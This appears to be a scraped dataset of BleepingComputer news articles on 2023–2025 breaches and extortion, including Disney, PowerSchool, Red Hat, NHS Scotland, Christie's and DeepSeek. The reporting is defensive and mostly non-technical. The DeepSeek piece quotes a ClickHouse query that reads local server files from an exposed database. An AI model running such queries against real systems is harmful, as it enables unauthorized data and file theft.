credentials, where they taunted employees about how they were breached. In August 2023, threat actors breached Activision's Slack server , stealing employee data and information about upcoming games.

Disney ditching Slack after massive July data breach,https://www.bleepingcomputer.com/news/security/disney-ditching-slack-after-massive-july-data-breach/,Lawrence Abrams,"September 20, 2024","The Walt Disney Company is reportedly ditching Slack after a July data breach exposed over 1TB of confidential messages and files posted to the company's internal communication channels. According to CNBC , Disney has already begun migrating to new ""streamlined enterprise-wide collaboration tools"" and emailed employees this week to say that they will finish the migration at the end of the company's next fiscal quarter. This move comes after the company suffered a massive data breach in July when a threat actor named 'NullBulge' breached Disney's Slack platform and stole 1.1TB of data. The threat actor claimed to steal all messages and files from almost 10,000 Slack channels containing upcoming project details, financial information, information technology information, and other confidential information. Disney suffered another data breach a month earlier when 2.5GB of Club Penguin and corporate data was leaked from the company’s Confluence server on the 4chan message board. It's unclear how employees will communicate after moving away from Slack and whether Disney will be transitioning to another enterprise platform, like Microsoft Teams, or their own internal software. Communication platforms, like Slack, can be a tempting target for threat actors to steal confidential files that can be used to taunt their victims. In 2022, the Lapsus$ hacking group breached Uber's Slack server using an employee's stolen credentials, where they taunted employees about how they were breached. In August 2023, threat actors breached Activision's Slack server , stealing employee data and information about upcoming games. It's budget season!

"PowerSchool hack exposes student, teacher data from K-12 districts",https://www.bleepingcomputer.com/news/security/powerschool-hack-exposes-student-teacher-data-from-k-12-districts/,Lawrence Abrams,"January 7, 2025","School districts known to be impacted by the PowerSchool breach are listed the bottom of the article. Education software giant PowerSchool has confirmed it suffered a cybersecurity incident that allowed a threat actor to steal the personal information of students and teachers from school districts using its PowerSchool SIS platform. PowerSchool is a cloud-based software solutions provider for K-12 schools and districts that supports over 60 million students and over 18,000 customers worldwide. The company offers a full range of services to help school districts operate, including platforms for enrollment, communication, attendance, staff management, learning systems, analytics, and finance. While the company's products are mostly known by school districts and their staff, PowerSchool also operates Naviance, a platform used by many K-12 districts in the US to offer personalized college, career, and life readiness planning tools to students. In a cybersecurity incident notification sent to customers Tuesday afternoon and obtained by BleepingComputer, PowerSchool says they first became aware of the breach on December 28, 2024, after PowerSchool SIS customer information was stolen through its PowerSource customer support platform. PowerSchool SIS is a student information system (SIS) used to manage student records, grades, attendance, enrollment, and more. ""As a main point of contact for your school district, we are reaching out to make you aware that on December 28, 2024 PowerSchool became aware of a potential cybersecurity incident involving unauthorized access to certain information through one of our community-focused customer support portals, PowerSource,"" reads a notification shared with BleepingComputer. After investigating the incident, it was determined that the threat actor gained access to the portal using compromised credentials and stole data using an ""export data manager"" customer support tool. ""The unauthorized party was able to use a compromised credential to access one of our community-focused customer support portals called PowerSource,"" PowerSchool told BleepingComputer in a statement. ""PowerSource contains a maintenance access tool that allows PowerSchool engineers to access Customer SIS instances for ongoing support and to troubleshoot performance issues."" Using this tool, the attacker exported the PowerSchool SIS 'Students' and 'Teachers' database tables to a CSV file, which was then stolen. PowerSchool has confirmed that the stolen data primarily contains contact details such as names and addresses. However, for some districts, it could also include Social Security numbers (SSNs), personally identifiable information (PII), medical information, and grades. A PowerSchool spokesperson told BleepingComputer that customer tickets, customer credentials, or forum data were not exposed or exfiltrated in the breach. The company also stressed that not all PowerSchool SIS customers were impacted and that they anticipate only a subset of customers will have to issue notifications. In response to the incident, the company engaged with third-party cybersecurity experts, including CrowdStrike, to investigate and mitigate the incident. This includes rotating the passwords for all PowerSource customer support portal accounts and implementing tighter password policies. In an unusually transparent FAQ only accessible to customers, PowerSchool also confirmed that this was not a ransomware attack but that they did pay a ransom to prevent the data from being released. ""PowerSchool engaged the services of CyberSteward, a professional advisor with deep experience in negotiating with threat actors,"" reads an FAQ seen by BleepingComputer. ""With their guidance, PowerSchool has received reasonable assurances from the threat actor that the data has been deleted and that no additional copies exist."" When asked how much was paid to the threat actors, BleepingComputer was told, ""Given the sensitive nature of our investigation, we are unable to provide information on certain specifics."" While the company said they received a video showing that the data was deleted, as with all data extortion attacks, there is never a hundred percent guarantee that it was. The company is now continuously monitoring the dark web to determine if the data has been leaked or will be leaked in the future. For those impacted, PowerSchool is offering credit monitoring services to impacted adults and identity protection services for impacted minors. PowerSchool says its operations remain unaffected, and services continue as usual despite the breach. The company is now notifying impacted school districts and will be providing a communications package that includes outreach emails, talking points, and FAQs to help inform teachers and families about the incident. If you have first-hand information or were behind the PowerSchool attack, we would like to speak to you. You can contact us confidentially on Signal at @LawrenceA.11 or on Telegram at @lbleeper. BleepingComputer has learned that PowerSchool will soon provide detailed guides for customers to check if they were impacted and determine what data was stolen. In the meantime, a Reddit thread about the incident contains valuable information from IT personnel whose school districts were impacted, explaining how to detect whether data was stolen from their PowerSchool SIS database. Customers can first check if a maintenance user named ""200A0"" is listed in the ps-log-audit files. This maintenance user is linked to the PowerSource ""export data manager"" customer support tool that the threat actor used to exfiltrate data. ""You can correlate audit log access with mass-data exports by time in the mass-data logs,"" advised a PowerSchool SIS customer . A detailed guide written by Romy Backus, SIS Specialist at the American School of Dubai, explains how to check the PowerSchool SIS logs to determine if data was stolen. This guide and other reports indicate that data was first stolen on December 22, 2024, from IP address 91.218.50.11 . This IP address belongs to a website and virtual hosting company in Ukraine. The guide explains how to check what data fields may have been stolen from the ""Students"" and ""Teachers"" database tables, which include a lot of sensitive information. While PowerSchool says that not all of these fields may be populated by data, the stolen data could include sensitive information for minors, such as names, addresses, phone numbers, Social Security Numbers, grade point averages, bus stops, passwords, notes, alerts, student IDs, parent information, and medical information. For teachers, the data could include their names, addresses, phone numbers, Social Security Numbers, and passwords. The investigation is ongoing, with cybersecurity firm CrowdStrike expected to release a finalized report by January 17, 2025. PowerSchool says they are committed to transparency and will share the report with affected school districts when it is ready. After the security incident was disclosed by PowerSchool, school districts have begun notifying parents and students about the breach today. Below is a list of school districts that our readers say were imapcted by the PowerSchool breach: * Residents of these school districts have shared emails stating they were impacted. If you have a formal link or email to a disclosure, please share it. Unfortunately, too many schools are impacted by this breach to keep updating this list, so there is no need to send us further schools.

""T-Mobile systems have not been compromised. We are actively investigating a claim of an issue at a third-party service provider,"" T-Mobile shared in a statement to BleepingComputer. ""We have no indication that T-Mobile customer data or source code was included and can confirm that the bad actor's claim that T-Mobile's infrastructure was accessed is false."" This statement comes after IntelBroker, a well-known threat actor linked to numerous breaches , claimed to have breached T-Mobile in June 2024 and stolen source code. To prove that the data is authentic and originates from a recent cyberattack, IntelBroker published several screenshots showing access with administrative privileges to a Confluence server and the company's internal Slack channels for developers. IntelBroker describes the data they're selling as ""Source code, SQL files, Images, Terraform data, t-mobile.com certifications, Siloprograms."" However, a source told BleepingComputer that the data shared by IntelBroker is actually older screenshots of T-Mobile's infrastructure posted to a third-party vendor's servers, where it was stolen.

Red Hat data breach escalates as ShinyHunters joins extortion,https://www.bleepingcomputer.com/news/security/red-hat-data-breach-escalates-as-shinyhunters-joins-extortion/,Lawrence Abrams,"October 6, 2025","Enterprise software giant Red Hat is now being extorted by the ShinyHunters gang, with samples of stolen customer engagement reports (CERs) leaked on their data leak site. News of the Red Hat data breach broke last week when a hacking group known as the Crimson Collective claimed to have stolen nearly 570GB of compressed data across 28,000 internal development repositories. This data allegedly includes approximately 800 Customer Engagement Reports (CERs), which can contain sensitive information about a customer's network, infrastructure, and platforms. The threat actors claimed to have attempted to extort Red Hat into paying a ransom to prevent the public disclosure of the data, but received no response. Red Hat later confirmed to BleepingComputer that the breach affected its GitLab instance, which was used solely for Red Hat Consulting on consulting engagements. Soon after the breach was disclosed, threat actors known as Scattered Lapsus$ Hunters sought to make contact with Crimson Collective. Yesterday, Crimson Collective announced that it had partnered with Scattered Lapsus$ Hunters to utilize the newly launched ShinyHunters data leak site to continue their extortion attempts against Red Hat. ""On the 4th April 1949 was created the so big called NATO, but what if today's new alliance was bigger than that ? But for a greater purpose, ruining corporations mind,"" reads a post to the hacking group's Telegram channel. ""What if, Crimson's shininess extends even further away ?"" ""Regarding the current announcement regarding us, we are going to collaborate with ShinyHunter's for the future attacks and releases,"" the Crimson Collective threat actors told BleepingComputer. In coordination with the announcement, a Red Hat entry has now appeared on a new ShinyHunters data leak extortion site, warning the company that data would be publicly leaked on October 10th if a ransom demand was not negotiated with ShinyHunters. In addition, the threat actors released samples of the stolen CERs, including those for Walmart, HSBC, Bank of Canada, Atos Group, American Express, Department of Defence, and Société Française du Radiotéléphone. BleepingComputer contacted Red Hat about this development but did not receive a response. For months, BleepingComputer has speculated that ShinyHunters was acting as an extortion-as-a-service (EaaS), where they work with threat actors to extort a company in exchange for a share of the extortion demand, similar to how ransomware-as-a-service gangs operate. This theory was based on the numerous attacks conducted by various threat actors, all of which were extorted under the ShinyHunters name, including those targeting Oracle Cloud and PowerSchool . Conversations with ShinyHunters further supported this theory, as the group has previously claimed not to be behind a particular breach but rather just acting as a broker of the stolen data. Furthermore, there have been numerous arrests of individuals associated with the name ""ShinyHunters"" over the years, including those linked to the Snowflake data theft attacks , breaches at PowerSchool , and the operation of the Breached v2 hacking forum . However, even after these arrests, new attacks occur with companies receiving extortion emails stating, ""We are ShinyHunters"". Today, ShinyHunters told BleepingComputer that they have been privately operating as an EaaS, where they take a revenue share from any extortion payments generated for other threat actors' attacks. ""Everyone i've worked with in the past have taken 70 or 75% and I receive a 25-30%,"" claimed the threat actor. With the launch of the ShinyHunters data leak site, it appears that the threat actor is now publicly operating the extortion service. In addition to Red Hat, ShinyHunters is also extorting SP Global on behalf of another threat actor that claimed to breach the company in February 2025. BleepingComputer had contacted SP Global at the time about the alleged breach, but was told that the claims were false and that the company was not breached. However, the threat actors have now released samples of data on the data leak site, claiming they were stolen during the attack, and have also set an October 10th deadline. After contacting SP Global again today regarding its inclusion on the data leak site, they decided not to comment on the claims. ""We don't comment on such claims. We note that as a US listed company, we are required to publicly disclose material cybersecurity incidents,"" SP Global told BleepingComputer. It's budget season!

HPE investigates breach as hacker claims to steal source code,https://www.bleepingcomputer.com/news/security/hewlett-packard-enterprise-investigates-new-breach-claims/#comment_form,Sergiu Gatlan,"January 20, 2025","Hewlett Packard Enterprise (HPE) is investigating claims of a new breach after a threat actor said they stole documents from the company's developer environments. The company has told BleepingComputer that it hasn't found any evidence of a security breach, but it is investigating the threat actor's claims. ""HPE became aware on January 16 of claims being made by a group called IntelBroker that it was in possession of information belonging to HPE,"" spokesperson Clare Loxley told BleepingComputer. ""HPE immediately activated our cyber response protocols, disabled related credentials, and launched an investigation to evaluate the validity of the claims. There is no operational impact to our business at this time, nor evidence that customer information is involved."" IntelBroker, who announced the sale of information allegedly stolen from HPE's networks, claims they had access to the company's API, WePay, and (private and public) GitHub repositories for at least two days and stole certificates (private and public keys), Zerto and iLO source code, Docker builds, and old user personal information used for deliveries. ​IntelBroker put up another archive of data (including credentials and access tokens) allegedly stolen from HPE's systems almost one year ago , on February 1, 2024. The company also said at the time that it was investigating the threat actor's claims but had no evidence of a security breach. IntelBroker gained notoriety after breaching DC Health Link —the organization that administers the U.S. House of Representatives members' health care plans—an incident that led to a congressional hearing after the personal data belonging to 170,000 affected individuals was leaked online. Other incidents linked to IntelBroker include the breaches of Nokia , Cisco , Europol , Home Depot , and Acuity and alleged breaches of AMD , the State Department , Zscaler , Ford , and General Electric Aviation . HPE was also breached in 2018 when APT10 Chinese hackers reportedly compromised some of its systems and used the access to hack into customers' devices. More recently, in 2021, the tech giant disclosed that the data repositories of its Aruba Central network monitoring platform had also been compromised , enabling attackers to access data about monitored devices and their locations. HPE also revealed one year ago that its Microsoft Office 365 email environment was breached in May 2023 by attackers believed to be part of the APT29 hacking group, which is linked to Russia's Foreign Intelligence Service (SVR).

While the exposed information also included customer names, usernames, and email addresses, it did not contain credentials for array access or any other data stored on customer systems. ""Following a thorough investigation, Pure Storage has confirmed and addressed a security incident involving a third party that had temporarily gained unauthorized access to a single Snowflake data analytics workspace,"" the storage company said . ""The workspace contained telemetry information that Pure uses to provide proactive customer support services. That information includes company names, LDAP usernames, email addresses, and the Purity software release version number."" Pure took measures to prevent further unauthorized access to its Snowflake workspace and has yet to find evidence of malicious activity on other parts of its customer infrastructure. ""We are currently in contact with customers who similarly have not detected unusual activity targeting their Pure systems,"" the company added. More than 11,000 customers use Pure Storage's data storage platform, including high-profile companies and organizations like Meta, Ford, JP Morgan, NASA, NTT, AutoNation, Equinix, and Comcast. In a joint advisory with Mandiant and CrowdStrike, Snowflake revealed that attackers use stolen customer credentials to target accounts lacking multi-factor authentication protection. Mandiant also linked the Snowflake attacks to a financially motivated threat actor tracked as UNC5537 since May 2024. The malicious actor gains access to Snowflake customer accounts using customer credentials stolen in historical infostealer malware infections dating back to 2020, targeting hundreds of organizations worldwide and extorting victims for financial gain. ""The impacted accounts were not configured with multi-factor authentication enabled, meaning successful authentication only required a valid username and password,"" Mandiant said. ""Credentials identified in infostealer malware output were still valid, in some cases years after they were stolen, and had not been rotated or updated. The impacted Snowflake customer instances did not have network allow lists in place to only allow access from trusted locations."" ​So far, the cybersecurity company has identified hundreds of customer Snowflake credentials exposed in Vidar, RisePro, Redline, Racoon Stealer, Lumm, and Metastealer infostealer malware attacks. Snowflake and Mandiant have already notified around 165 organizations potentially exposed to these ongoing attacks. While Mandiant has not disclosed much information about UNC5537, BleepingComputer has learned that they are part of a larger community of threat actors who frequently visit the same websites, Telegram and Discord servers, where they regularly collaborate on attacks. Recent breaches at Santander , Ticketmaster , and QuoteWizard/LendingTree have also been linked to these ongoing Snowflake attacks. Ticketmaster's parent company, Live Nation, confirmed that a data breach affected the ticketing firm after its Snowflake account was compromised on May 20.

ASVEL basketball team confirms data breach after ransomware attack,https://www.bleepingcomputer.com/news/security/asvel-basketball-team-confirms-data-breach-after-ransomware-attack/,Bill Toulas,"October 24, 2023","French professional basketball team LDLC ASVEL (ASVEL) has confirmed that data was stolen after the NoEscape ransomware gang claimed to have attacked the club. ASVEL is a French professional basketball team in Villeurbanne, Lyon, headed by former NBA star Tony Parker. The club is considered the most successful one in the country, having won 21 national championships and 10 cups. ASVEL's says that they were alerted to a potential breach on October 12 via the press, following their addition to NoEscape ransomware's extortion portal on October 9, 2023. ""Alerted on October 12 through the press and having immediately contacted companies specializing in the field of cybersecurity, LDLC ASVEL is unfortunately today able to confirm that it has indeed been the victim of a violation of its computer system, with data exfiltration,"" reads a press statement from ASVEL. The threat actors claimed to have stolen 32 GB of data, including the personal data of players, passports and ID cards, and many documents relating to finance, taxation, and legal matters. NDAs, contracts, confidential letters. Contractual agreements with players are also allegedly included in the stolen data set. The NoEscape ransomware gang is using this stolen data as leverage, threatening to publish it by October 20, 2023, unless ASVEL contacts them to negotiate a ransom payment. ASVEL says they retained cybersecurity specialists who, on October 18, 2023, confirmed that the attackers breached the club's systems and stole data. Although the breach did not impact the club's operations, it is assessing the harm to third parties with data exposed in this incident. One concern is the payment details of those who bought tickets, merchandise, and club membership cards from the official website. As of today, ASVEL says it has no evidence that the attackers have stolen its fans' payment data or bank account details. The incident has been reported to CNIL (Commission Nationale de l'Informatique et des Libertés), France's national data protection authority, and a formal complaint is soon to be submitted to law enforcement authorities. It is worth noting that ASVEL has been removed from NoEscape's darknet portal, and the link to the original entry now returns a 404 error. Also, no data has been leaked. This could indicate that the club is negotiating with the ransomware gang to prevent the leak of data. NoEscape is a relatively new ransomware group launched in June 2023 , targeting non-CIS (ex-Soviet Union) organizations with double-extortion attacks and demanding ransom payments ranging from a few thousand USD to over $10 million. Believed to be a rebrand of Avaddon, which went defunct in 2021, NoEscape is capable of targeting Windows, Linux, and VMware ESXi servers.

Red Hat confirms security incident after hackers breach GitLab instance,https://www.bleepingcomputer.com/news/security/red-hat-confirms-security-incident-after-hackers-breach-gitlab-instance/#comments,Lawrence Abrams,"October 2, 2025","Correction: After publishing, Red Hat confirmed that it was a breach of one of its GitLab instances, and not GitHub. Title and story updated. An extortion group calling itself the Crimson Collective claims to have stolen nearly 570GB of compressed data across 28,000 internal development respositories belonging to Red Hat, with the company confirming it was a breach of one of its GitLab instances. This data allegedly includes approximately 800 Customer Engagement Reports (CERs), which can contain sensitive information about a customer's network and platforms. A CER is a consulting document prepared for clients that often contains infrastructure details, configuration data, authentication tokens, and other information that could be abused to breach customer networks. Red Hat confirmed that it suffered a security incident related to its consulting business, but would not verify any of the attacker's claims regarding the stolen GitLab repositories and customer CERs. ""Red Hat is aware of reports regarding a security incident related to our consulting business and we have initiated necessary remediation steps,"" Red Hat told BleepingComputer. ""The security and integrity of our systems and the data entrusted to us are our highest priority. At this time, we have no reason to believe the security issue impacts any of our other Red Hat services or products and are highly confident in the integrity of our software supply chain."" After publishing our story, Red Hat confirmed that the security incident was a breach of its GitLab instance used solely for Red Hat Consulting on consulting engagements, and not GitHub. While Red Hat did not respond to any further questions about the breach, the hackers told BleepingComputer that the intrusion occurred approximately two weeks ago. They allegedly found authentication tokens, full database URIs, and other private information in Red Hat code and CERs, which they claimed to use to gain access to downstream customer infrastructure. The hacking group also published a complete directory listing of the allegedly stolen GitLab repositories and a list of CERs from 2020 through 2025 on Telegram. The directory listing of CERs include a wide range of sectors and well known organizations such as Bank of America, T-Mobile, AT&T, Fidelity, Kaiser, Mayo Clinic, Walmart, Costco, the U.S. Navy’s Naval Surface Warfare Center, Federal Aviation Administration, the House of Representatives, and many others. If you have any information regarding this incident or any other undisclosed attacks, you can contact us confidentially via Signal at 646-961-3731 or at tips@bleepingcomputer.com. The hackers stated that they attempted to contact Red Hat with an extortion demand but received no response other than a templated reply instructing them to submit a vulnerability report to their security team. According to them, the created ticket was repeatedly assigned to additional people, including Red Hat's legal and security staff members. BleepingComputer sent Red Hat additional questions, and we will update this story if we receive more information. The same group also claimed responsibility for briefly defacing Nintendo’s topic page last week to include contact information and links to their Telegram channel.

""We recently detected unauthorized access to a GitLab instance used for internal Red Hat Consulting collaboration in select engagements,"" reads the Red Hat security update . ""Upon detection, we promptly launched a thorough investigation, removed the unauthorized party's access, isolated the instance, and contacted the appropriate authorities. Our investigation, which is ongoing, found that an unauthorized third party had accessed and copied some data from this instance."" ""We have now implemented additional hardening measures designed to help prevent further access and contain the issue."" Red Hat emphasized that the GitLab instance is only used by its consulting division and the breach does not impact other Red Hat products or its supply chain, including software downloaded from official channels.

INC Ransom threatens to leak 3TB of NHS Scotland stolen data,https://www.bleepingcomputer.com/news/security/inc-ransom-threatens-to-leak-3tb-of-nhs-scotland-stolen-data/,Bill Toulas,"March 27, 2024","The INC Ransom extortion gang is threatening to publish three terabytes of data allegedly stolen after breaching the National Health Service (NHS) of Scotland. In a post yesterday, the cybercriminals shared multiple images containing medical details and said that they would leak data ""soon,"" unless the NHS pays a ransom. Scotland's NHS is the country’s public health system, providing services ranging from primary care, hospital care, dental care, pharmaceutical, and long-term care. INC Ransom is a data extortion operation that emerged in July 2023 and targets organizations in both the public and the private sector. Among the victims are education, healthcare, and government organizations, and industrial entites like Yamaha Motor . Reports about a cybersecurity incident disrupting NHS Scotland services appeared on March 15, likely when the attack occurred. In yesterday's post, the threat actor published several sample documents with sensitive information about doctors and patients, including medical assessments, analysis results, and psychological reports. A spokesperson for the Scottish Government told BleepingComputer that the cyberattack impacts only NHS Dumfries and Galloway, one of the regional health boards that make up NHS Scotland. ""We are aware of some data published on the web that is linked to the recent cyber-attack on NHS Dumfries and Galloway. This incident remains contained to NHS Dumfries and Galloway and there have been no further incidents across NHS Scotland as a whole,"" - Scottish Government The spokesperson added that the government is working with multiple entities, including the health board, Police Scotland and other agencies (e.g. National Crime Agency, National Cyber Security Centre) to determine the impact of the breach ""and the possible implications for individuals concerned."" Meanwhile, NHS Dumfries and Galloway has confirmed today that a ransomware group leaked clinical data relating to a small number of patients. The organization states that this was the result of the cyberattack that occurred two weeks ago, which compromised its IT systems and resulted in the unauthorized access of “a significant amount of data including patient and staff-identifiable information.” “We absolutely deplore the release of confidential patient data as part of this criminal act,” stated NHS Dumfries and Galloway Chief Executive Jeff Ace. “This information has been released by hackers to evidence that this is in their possession.” Ace said that patient-facing services are operating normally, and the organization is working with the police and the National Cyber Security Center (NCSC) to formulate a response to the situation.

INC Ransom threatens to leak 3TB of NHS Scotland stolen data,https://www.bleepingcomputer.com/news/security/inc-ransom-threatens-to-leak-3tb-of-nhs-scotland-stolen-data/#comment_form,Bill Toulas,"March 27, 2024","The INC Ransom extortion gang is threatening to publish three terabytes of data allegedly stolen after breaching the National Health Service (NHS) of Scotland. In a post yesterday, the cybercriminals shared multiple images containing medical details and said that they would leak data ""soon,"" unless the NHS pays a ransom. Scotland's NHS is the country’s public health system, providing services ranging from primary care, hospital care, dental care, pharmaceutical, and long-term care. INC Ransom is a data extortion operation that emerged in July 2023 and targets organizations in both the public and the private sector. Among the victims are education, healthcare, and government organizations, and industrial entites like Yamaha Motor . Reports about a cybersecurity incident disrupting NHS Scotland services appeared on March 15, likely when the attack occurred. In yesterday's post, the threat actor published several sample documents with sensitive information about doctors and patients, including medical assessments, analysis results, and psychological reports. A spokesperson for the Scottish Government told BleepingComputer that the cyberattack impacts only NHS Dumfries and Galloway, one of the regional health boards that make up NHS Scotland. ""We are aware of some data published on the web that is linked to the recent cyber-attack on NHS Dumfries and Galloway. This incident remains contained to NHS Dumfries and Galloway and there have been no further incidents across NHS Scotland as a whole,"" - Scottish Government The spokesperson added that the government is working with multiple entities, including the health board, Police Scotland and other agencies (e.g. National Crime Agency, National Cyber Security Centre) to determine the impact of the breach ""and the possible implications for individuals concerned."" Meanwhile, NHS Dumfries and Galloway has confirmed today that a ransomware group leaked clinical data relating to a small number of patients. The organization states that this was the result of the cyberattack that occurred two weeks ago, which compromised its IT systems and resulted in the unauthorized access of “a significant amount of data including patient and staff-identifiable information.” “We absolutely deplore the release of confidential patient data as part of this criminal act,” stated NHS Dumfries and Galloway Chief Executive Jeff Ace. “This information has been released by hackers to evidence that this is in their possession.” Ace said that patient-facing services are operating normally, and the organization is working with the police and the National Cyber Security Center (NCSC) to formulate a response to the situation. Moreover, he assured that all patients who had their info leaked online will be informed directly by the NHS so they may take the appropriate measures to protect themselves. It's budget season!

The organization published a statement on its website, as required by Article 34 of the General Data Protection Regulation (GDPR), which mandates a public notice in the event of a data breach. AMEOS is a Zurich-based healthcare provider that employs 18,000 staff in over 100 hospitals, clinics, rehabilitation centers, and nursing homes located across Switzerland, Germany, and Austria. It is one of the largest private hospital groups in the broader DACH region, with over 10,000 beds and annual revenue exceeding $1.4 billion. AMEOS informs that, despite the ""extensive security measures"" in place, external actors gained unauthorized access to its IT systems and accessed sensitive information.

""It cannot be ruled out that this data may be misused on the internet to the detriment of those affected or made accessible to third parties."" In response, AMEOS has shut down all IT systems and terminated all external and internal network connections. Additionally, it reinforced existing measures and contracted external IT and forensic experts to aid with response efforts. The data protection authorities in the countries have been informed accordingly, and a criminal complaint was filed with the police. People who have received care at AMEOS facilities are advised to remain vigilant against phishing and scam attempts. To date, there are no signs that the accessed data has been disseminated online, stated the healthcare provider. The investigation is still underway, and AMEOS has promised to provide updates as new information becomes available.

It employs 26,000 staff, including 1,600 doctors, and is considered one of Pennsylvania’s most important organizations. An announcement published earlier this week explains that in November 2023, Geisinger detected unauthorized access to its patients’ database by a former Nuance employee. Nuance was promptly informed and took action to block the former employee’s access to Geisinger’s systems holding patient records. “On Nov. 29, 2023, Geisinger discovered and immediately notified Nuance that a former Nuance employee had accessed certain Geisinger patient information two days after the employee had been terminated,” reads the announcement . “Upon learning this, Nuance permanently disconnected its former employee’s access to Geisinger’s records.” Subsequently, Nuance informed the law enforcement authorities accordingly, and the former employee was arrested and charged. According to the company’s investigation, the following information was compromised: The exact data types exposed varies per person, depending on what services they got through Geisinger. This incident did not impact insurance information, credit card details, bank account number, Social Security Number (SSN), and other financial data. It is unclear how exactly the former employee attempted to exploit the stolen data, or if it has been disseminated already to cybercriminals, so potentially impacted people are advised to remain vigilant. Typically, sacked employees who access systems using non-revoked accounts/credentials do so out of spite, aiming to cause reputation and business damage. Geisinger suggests that people who are notified about the breach carefully review their statements and notify their health insurers immediately if they see entries they don’t recognize. Law firm Lynch Carpenter has already announced an investigation on the scope of the incident, exploring the potential for a class action lawsuit against Geisinger.

US energy firm shares how Akira ransomware hacked its systems,https://www.bleepingcomputer.com/news/security/us-energy-firm-shares-how-akira-ransomware-hacked-its-systems/,Bill Toulas,"October 23, 2023","In a rare display of transparency, US energy services firm BHI Energy details how the Akira ransomware operation breached their networks and stole the data during the attack. BHI Energy, part of Westinghouse Electric Company, is a specialty engineering services and staffing solutions provider supporting private and government-operated oil & gas, nuclear, wind, solar, and fossil power generation units and electricity transmission and distribution facilities. In a data breach notification sent by BHI Energy to impacted people, the company provides detailed information on how the Akira ransomware gang breached its network on May 30, 2023. The attack first started by the Akira threat actor using the stolen VPN credentials for a third-party contractor to access BGI Energy's internal network. ""Using that third-party contractor's account, the TA (threat actor) reached the internal BHI network through a VPN connection,"" reads the data breach notification . ""In the week following initial access, the TA used the same compromised account to perform reconnaissance of the internal network."" The Akira operators revisited the network on June 16, 2023, to enumerate data would be stolen. Between June 20 and 29, the threat actors stole 767k files containing 690 GB of data, including BHI's Windows Active Directory database. Finally, on June 29, 2023, having stolen all data they could from BHI's network, the threat actors deployed the Akira ransomware on all devices to encrypt files. This was when BHI's IT team realized the company had been compromised. The firm says they immediately informed law enforcement and engaged with external experts to help them recover the impacted systems. The threat actor's foothold on BHI's network was removed on July 7, 2023. The company says it was able to recover data from a cloud backup solution that hadn't been affected by the ransomware attack, so they were able to restore their systems without paying a ransom. Additionally, BHI bolstered its security measures by imposing multi-factor authentication on VPN access, performing a global password reset, extending the deployment of EDR and AV tools to cover all sections of its environment, and decommissioning legacy systems. While BHI was able to recover its systems, the threat actors could steal data containing employees' personal information. An investigation concluded on September 1, 2023, indicates that the following data was stolen: At the time of writing this, Akira ransomware has not leaked any data belonging to BHI on its extortion portal on the dark web, and neither have the cybercriminals announced BHI in their upcoming data leaks.

Christie’s confirms breach after RansomHub threatens to leak data,https://www.bleepingcomputer.com/news/security/christies-confirms-breach-after-ransomhub-threatens-to-leak-data/,Bill Toulas,"May 28, 2024","Christie's confirmed that it suffered a security incident earlier this month after the RansomHub extortion gang claimed responsibility and threatened to leak stolen data. Christie's is a prominent auction house with a history spanning 2.5 centuries. It operates in 46 countries and specializes in selling art, luxury items, and high-valued collectibles. Christie's has handled numerous notable auctions such as Leonardo da Vinci's Salvator Mundi for $450 million in 2017, the Yves Saint Laurent and Pierre Bergé collection for 370 million euros in 2009, and Paul Allen's art collection that surpassed $1.5 billion in 2022. Yesterday, the RansomHub ransomware group added Christie's on its extortion page on the dark web, claiming it had breached the company and stole sensitive client data. A Christie's spokesperson confirmed to BleepingComputer that the company had suffered a data breach that impacted some clients. ""Earlier this month Christie's experienced a technology security incident. We took swift action to protect our systems, including taking our website offline,"" confirmed the spokesperson. ""Our investigations determined there was unauthorized access by a third party to parts of Christie's network."" ""They also determined that the group behind the incident took some limited amount of personal data relating to some of our clients."" The spokesperson noted that there is no evidence that any financial or transactional records were compromised due to this incident. Christie's says it is notifying privacy regulators and government agencies and will also inform all affected clients through personalized communication. RansomHub listed Christie's on its extortion portal, giving the company a little over five days at the time of writing, before they leak the company's stolen data. RansomHub is a relatively new extortion group that demands ransom payment from victims in exchange for not publishing and deleting data stolen in attacks. Ironically enough, the threat actors often auction the stolen files, sharing them exclusively with the highest bidder. The cybercriminals claim to hold the full names, physical addresses, ID document details, and various other sensitive information of 500,000 Christie's clients. Interestingly, RansomHub uses reputation loss and heavy GDPR fines as a lever of pressure in its announcement of Christie's. The attackers also allege that they attempted to negotiate a resolution with the auction house, but the former abandoned the effort midway. While many consider RansomHub to be a ransomware gang, no encryptor has been found for the operation, indicating that they currently only conduct data theft attacks or partner with other threat actors to help extort companies. This was seen after the recent Change Healthcare/United Health ransomware attack when RansomHub's site was used to leak samples of files stolen by a BlackCat ransomware affiliate, attempting to extort the American healthcare giant.

In a data breach notification seen by BleepingComputer, Plex says the stolen data includes email addresses, usernames, securely hashed passwords, and authentication data. ""An unauthorized third party accessed a limited subset of customer data from one of our databases,"" reads the Plex data breach notification. ""While we quickly contained the incident, information that was accessed included emails, usernames, and securely hashed passwords."" ""Any account passwords that may have been accessed were securely hashed, in accordance with best practices, meaning they cannot be read by a third party."" Plex has not shared what hashing algorithm was used, raising the possibility that attackers could attempt to crack the passwords. Therefore, Plex recommends that users, out of an ""abundance of caution,"" reset their password at https://plex.tv/reset and also enable the ""Sign out connected devices after password change"" option when doing so. This will reset your password and log out any existing connections utilizing your own credentials. However, this will also require you to log in again on any devices using those credentials. For those using SSO to log in to Plex, the company recommends you log out of all active sessions by visiting https://plex.tv/security and clicking the button that says"" Sign out of all devices"". Once again, you will need to log back into devices using your credentials. The company is also reminding users to enable two-factor authentication for added protection and stresses that it will never ask for passwords or credit card details over email. Plex says no payment card information was included in the breach, as it's not stored on its server.

DeepSeek exposes database with over 1 million chat records,https://www.bleepingcomputer.com/news/security/deepseek-exposes-database-with-over-1-million-chat-records/,Bill Toulas,"January 30, 2025","DeepSeek, the Chinese AI startup known for its DeepSeek-R1 LLM model, has publicly exposed two databases containing sensitive user and operational information. The unsecured ClickHouse instances reportedly held over a million log entries containing user chat history in plaintext form, API keys, backend details, and operational metadata. Wiz Research discovered this exposure during a security assessment of DeepSeek's external infrastructure. The security firm found two publicly accessible database instances at oauth2callback.deepseek.com:9000 and dev.deepseek.com:9000 that allowed arbitrary SQL queries via a web interface without requiring authentication. The databases contained a 'log_stream' table that stored sensitive internal logs dating from January 6, 2025, containing: ""This level of access posed a critical risk to DeepSeek's own security and for its end-users,"" comments Wiz . ""Not only an attacker could retrieve sensitive logs and actual plaintext chat messages, but they could also potentially exfiltrate plaintext passwords and local files along propriety information directly from the server using queries like: SELECT * FROM file('filename') depending on their ClickHouse configuration."" Wiz says it could execute more intrusive queries but limited its exploration to enumeration to keep its research within certain ethical constraints. It is 